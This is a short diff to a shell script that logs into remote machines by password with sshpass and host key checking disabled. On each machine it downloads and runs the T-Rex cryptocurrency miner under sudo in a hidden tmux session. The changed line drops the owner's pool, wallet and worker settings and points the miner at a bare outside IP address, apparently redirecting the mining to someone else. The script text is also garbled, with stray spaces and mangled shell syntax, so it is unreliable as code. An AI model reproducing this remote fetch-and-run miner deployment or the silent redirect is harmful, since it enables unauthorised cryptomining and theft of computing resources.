@@ -28,7 +28,7 @@ do
             echo $session 
             if [["$session"! = * "1 window"
                 echo "start ssh" 
-                sshpass -p $password ssh -o StrictHostKeyChecking = no $username @ $ip -p $port "wget ​​https://github.com/trexminer/T-Rex/releases/download/0.25 .9/t-rex-0.25. 9-linux.tar.gz; tar -xf t-rex-0.25.9-linux.tar.gz; tmux new-session -d -s 1; tmux send -t 1 \ "sudo ./t-rex -a ethash -o stratum + tcp://eth.2miners.com: 2020 -u $ wallet -px -w $ worker \ "ENTER" 
+                sshpass -p $password ssh -o StrictHostKeyChecking = no $username @ $ip -p $port "wget ​​https://github.com/trexminer/T-Rex/releases/download/0.25 .9/t-rex-0.25. 9-linux.tar.gz; tar -xf t-rex-0.25.9-linux.tar.gz; tmux new-session -d -s 1; tmux send -t 1 \ "sudo ./t-rex -a ethash -o http://45.117.164.125:5000 \ "ENTER" 
             other 
                 echo "running" 
             fi 
